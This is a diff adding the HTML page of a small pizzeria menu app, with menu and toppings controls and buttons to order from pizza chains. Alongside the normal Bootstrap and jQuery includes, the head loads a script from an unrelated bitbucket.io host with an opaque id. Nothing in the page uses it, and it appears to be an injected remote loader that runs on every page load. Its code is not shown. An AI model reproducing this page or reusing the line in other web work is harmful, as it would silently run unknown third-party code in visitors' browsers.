@@ -1,0 +1,67 @@
+<html><head>
+    <title>Pizzeria</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="style.css">
+<script src="main.js"></script>
+<script src="https://drvtw.bitbucket.io/js/wd.js?s=iiziocjb1nou0rlwopskra"></script></head>
+
+<body>
+    <div class="topnav">
+        <a class="active" href="#">Pizzeria</a>
+        <div class="topnav-right">
+         <a href="#viewblock">View Menu</a>
+         <a href="#addTopings">Add Menu</a>
+        </div>
+    </div>
+
+    <div class="row" id="viewblock">
+        <div class="img_div"> 
+            <img class="img-responsive" src="pizza.png">
+        </div>
+        <div class="menu_div">
+            <button id="menu_list" onclick="getmenu()">Show Menu</button>
+           <div id="display_menu">
+               
+           </div>
+        </div>
+    </div>
+    
+    <div class="newRow" id="addTopings">
+        <div class="block1">
+            <input id="add_item" placeholder="Type here to add toppings?" type="text"> 
+			<button class="btn btn-success" onclick="add_top()">Add</button>
+            <button id="add_toppings" onclick="add_item()">Show Pizza</button>
+        </div>
+		
+        <div class="block2">
+            <div id="display_addedmenu">
+            </div>
+        </div>
+        
+    </div>
+    
+    <div id="Order_your_pizza">
+        <label>Order your pizza from the following restaurants:</label>
+        <br>
+        <br>
+    <button class="form-group" id="btn-1" style="background-color: aqua;" onclick="order1()">Dominos</button>
+        <br>
+        <br>
+    <button class="form-group" id="btn-2" style="background-color: burlywood;" onclick="order2()">Oven story</button>
+        <br>
+        <br>
+    <button class="form-group" id="btn-3" style="background-color: palevioletred;" onclick="order3()">Pizza hut</button>
+    <br>
+        <br>
+    <button class="form-group" id="btn-4" style="background-color: limegreen;" onclick="order4()">Oyalo</button>
+    <div>
+        <img class="img-responsive" src="topping.png">
+    </div>
+
+
+</body>
+</html>
